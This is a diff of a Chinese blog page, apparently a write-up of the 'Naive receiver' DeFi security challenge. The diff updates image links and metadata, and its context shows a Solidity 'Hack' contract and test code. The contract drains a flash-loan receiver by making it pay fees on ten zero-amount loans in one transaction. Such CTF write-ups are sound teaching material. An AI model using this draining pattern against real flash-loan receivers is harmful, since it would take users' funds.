@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1689406589355),
+    lastupdate: new Date(1689408595098),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,7 +2995,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：578 字</p>
+      <p>字数：562 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3070,7 +3070,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="title function_">it</span>(<span class="string">&#x27;Execution&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR SOLUTION HERE */</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">ETH</span> = <span class="keyword">await</span> pool.<span class="title function_">ETH</span>()；</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">await</span> pool.<span class="title function_">flashLoan</span>(receiver.<span class="property">address</span>, <span class="variable constant_">ETH</span>, <span class="number">0</span>, <span class="string">&quot;0x&quot;</span>);            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <p>这样，的结果也是正确的</p>
-<p>![image-20230710112629791](Naive receiver&#x2F;image-20230710112629791.png)</p>
+<p><img src="https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202307151605794.png" alt="image-20230710112629791"></p>
 <p>但是，题目要求在一笔交易中完成，那就很简单了，将这10次调用放在一个合约中即可。</p>
 <p><code>Hack.sol</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;./NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line">    function attack(address payable _pool, address payable _receiver) external &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; 10; i++) &#123;            </span><br><span class="line">            NaiveReceiverLenderPool(_pool).flashLoan(</span><br><span class="line">            IERC3156FlashBorrower(_receiver),</span><br><span class="line">            ETH,</span><br><span class="line">            0 ether,</span><br><span class="line">            &quot;&quot;</span><br><span class="line">        );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3079,7 +3079,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Execution&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR SOLUTION HERE */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">AttractContract</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;Hack&#x27;</span>, player);</span><br><span class="line">        <span class="keyword">const</span> attracter = <span class="keyword">await</span> <span class="title class_">AttractContract</span>.<span class="title function_">deploy</span>();</span><br><span class="line">        <span class="keyword">await</span> attracter.<span class="title function_">attack</span>(pool.<span class="property">address</span>, receiver.<span class="property">address</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<p>![image-20230710112902252](Naive receiver&#x2F;image-20230710112902252.png)</p>
+<p><img src="https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202307151605981.png" alt="image-20230710112902252"></p>
 <p>解题成功。</p>
 
   </div>
